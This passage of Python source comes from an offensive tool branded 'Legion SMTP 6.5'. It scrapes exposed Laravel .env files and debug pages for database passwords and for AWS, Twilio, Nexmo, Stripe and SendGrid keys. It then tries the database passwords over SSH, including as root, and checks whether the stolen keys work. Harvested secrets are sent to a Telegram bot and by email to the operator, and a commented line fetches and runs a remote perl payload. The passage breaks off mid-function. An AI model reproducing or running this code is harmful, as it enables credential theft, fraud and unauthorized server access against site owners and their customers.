            message = {'text': f"🔥  Legion SMTP 6.5 BOT [SENDGRID LIMIT]\n🏦 APIKEY = {f_key}\nLIMIT= {go_to['total']}\nREMAIN= {go_to['remain']}\nFROM_MAIL= {cekmail['email']}\nSENDGRID OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            smtp_login(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def ceker_aws(url, ACCESS_KEY, SECRET_KEY, REGION):
    print(f'{red}# {fc}[AWS QUOTA] {gr}CHECKING...')
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        balance = client.get_send_quota()['Max24HourSend']
        message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS LIMIT]\n🏦 KEY= {ACCESS_KEY}\nSECRET= {SECRET_KEY}\nREGION= {REGION}\nLIMIT= {balance}\nAWS OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Results/!AWS_key_live.txt', 'a')
        remover = str(balance).replace(',', '\n')
        save.write(str(ACCESS_KEY) + '|' + str(SECRET_KEY) + '|' + str(REGION) + '|' + str(balance)+'\n')
        save.close()
        print(f'{red}# {gr}[AWS QUOTA VALID] {cy}{ACCESS_KEY} {yl} ==> {red}{balance}')
    except:
        pass
def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    login = str(mailuser.replace('"', ''))  # paste your login generated by Mailtrap
    password = str(mailpass.replace('"', '')) # paste your password generated by Mailtrap
    receiver_email = emailnow
    message = MIMEMultipart('alternative')
    message['Subject'] = 'SMTP LOG | HOST: '
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"        <html>\n          <body>\n            <p>Send,<br>\n              BY LEGION</p>\n              <p>-------------------</p>\n              <p>URL    : {url}</p>\n              <p>HOST   : {mailhost}</p>\n              <p>PORT   : {mailport}</p>\n              <p>USER   : {mailuser}</p>\n              <p>PASSW  : {mailpass}</p>\n              <p>SENDER : {mailfrom}</p>\n              <p>-------------------</p>\n  Smtp:{mailhost}|{mailport}|{mailuser}|{mailpass}        </body>\n        </html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        message = {'text': f"☄️  Legion SMTP 6.5 BOT [SMTP Live]\n📪 {mailhost}|{mailport}|{mailuser}|{mailpass}\nFrom:{mailfrom}\nSending OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Results/!Valid_Smtps.txt', 'a')
        save.write(f'{mailhost}|{mailport}|{mailuser}|{mailpass}|{mailfrom}\n')
        save.close()
    except:
        pass





class legion:
	def getSSH(sel, text, url):
			if 'DB_PASSWORD' in text and 'DB_HOST' in text:
				if '://' in url:
					parse = url.split('://', 2)
					parse = parse[1]
					parse = parse.split('/')
					host = parse[0]
				else:
					parse = parse.split('/')
					host = parse[0]

				# grab password
				if 'DB_USERNAME=' in text:
					method = './env'
					db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
					db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
				elif '<td>DB_USERNAME</td>' in text:
					method = 'debug'
					db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

				# login ssh
				if db_user and db_pass:
					connected = 0
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, db_user, db_pass, timeout=3)
						fp = open('Results/!Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

					if db_user != 'root':
						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:
							ssh.connect(host, 22, 'root', db_pass, timeout=30)
							fp = open('Results/!Vps.txt', 'a+')
							build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
							remover = str(build).replace('\r', '')
							fp.write(remover + '\n\n')
							fp.close()
							connected += 1
						except:
							pass
						finally:
							if ssh:
								ssh.close()

					if '_' in db_user:
						aw, iw = db_user.split('_')
						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						#stdin, stdout, stderr = ssh.exec_command("cd /tmp; wget -qO - narcio.com/lans1|perl; curl -s narcio.com/lans1|perl")
						try:
							ssh.connect(host, 22, iw, db_pass, timeout=30)
							fp = open('Results/!Vps.txt', 'a+')
							build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
							remover = str(build).replace('\r', '')
							fp.write(remover + '\n\n')
							fp.close()
							connected += 1
						except:
							pass
						finally:
							if ssh:
								ssh.close()

						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:
							ssh.connect(host, 22, aw, db_pass, timeout=30)
							fp = open('Results/!Vps.txt', 'a+')
							build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
							remover = str(build).replace('\r', '')
							fp.write(remover + '\n\n')
							fp.close()
							connected += 1
						except:
							pass
						finally:
							if ssh:
								ssh.close()

					if connected > 0:
						return connected
					else:
						return False
			else:
				return False
	def get_twillio(self, text, url):
		if '<td>TWILIO_ACCOUNT_SID</td>' in text:
		  acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
		  auhtoken = re.findall('<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if '<td>TWILIO_SID</td>' in text:
		  acc_sid = re.findall('<td>TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  auhtoken = re.findall('<td>TWILIO_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if '<td>#TWILIO_SID</td>' in text:
		  acc_sid = re.findall('<td>#TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  auhtoken = re.findall('<td>#TWILIO_AUTH<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if '<td>#TWILIO_ACCOUNT_SID</td>' in text:
		  acc_sid = re.findall('<td>#TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
		  auhtoken = re.findall('<td>#TWILIO_ACCOUNT_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if 'TWILIO_ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if 'TWILIO_SID=' in text:
		  acc_sid = re.findall('\nTWILIO_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\nTWILIO_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if '#TWILIO_ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\n#TWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\n#TWILIO_ACCOUNT_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if 'ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\nACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\nAUTH_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
		if '#ACCOUNT_SID=' in text:
		  acc_sid = re.findall('\n#ACCOUNT_SID=(.*?)\n', text)[0]
		  auhtoken = re.findall('\n#AUTH_TOKEN=(.*?)\n', text)[0]
		  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)
		  remover = str(build).replace('\r', '')
		  print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ TWILIO [{acc_sid}:{auhtoken}]"))
		  save = open(o_twilio, 'a')
		  save.write(remover+'\n')
		  save.close()
		  build_forchecker = cleanit(str(acc_sid)+"|"+str(auhtoken))
		  remover2 = str(build_forchecker).replace('\r', '')
		  save2 = open('Results/forchecker/twilio_for_checker.txt','a')
		  save2.write(remover2+'\n')
		  save2.close()
		  legiontwilio2(acc_sid, auhtoken)
		  objek += 1

		  print(Colorate.Horizontal(Colors.red_to_green,f"[{ntime()}] ╾┄╼ {url} | Not Vuln !!"))
	def get_nexmo(self, text, url):
		if 'NEXMO_KEY=' in text:
			key = re.findall('NEXMO_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])

				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ NEXMO [{key}:{sec}]"))


		elif 'NEXMO_API_KEY=' in text:
			key = re.findall('NEXMO_API_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_API_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ NEXMO [{key}:{sec}]"))
		elif 'NEXMO_KEY' in text:
			key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ NEXMO [{key}:{sec}]"))
		elif 'NEXMO_API_KEY' in text:
			key = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ NEXMO [{key}:{sec}]"))
	def payment_api(self, text, url):

		if "PAYPAL_" in text:
			save = open(o_sandbox,'a')
			save.write(url+'\n')
			save.close()
			return True
		elif "STRIPE_KEY" in text:
			if "STRIPE_KEY=" in text:
				method = '/.env'
				try:
					stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('\nSTRIPE_SECRET={.*?)\n', text)[0]
				except:
					stripe_secret = ''
			elif "<td>STRIPE_SECRET</td>" in text:
				method = 'debug'
				try:
					stripe_key = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_secret = ''
			build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
			remover = str(build).replace('\r', '')
			save = open(o_stripe, 'a')
			save.write(remover+'\n')
			save.close()
			saveurl = open(o_stripe_site,'a')
			removerurl = str(url).replace('\r', '')
			saveurl.write(removerurl+'\n')
			saveurl.close()
		else:
			return False
	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break
	def get_raw_mode(self, text, url):
		try:
			if "email-smtp." in text:
				if "<html>" in text:
					method = 'debug'
				else:
					method = '.env'

				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open('Results/manual/MANUAL_SES.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SNS_KEY" in text:
				if "AWS_SNS_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
					except:
						sms_deiver = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_driver = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_S3_KEY" in text:
				if "AWS_S3_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SES_KEY" in text:
				if "AWS_SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
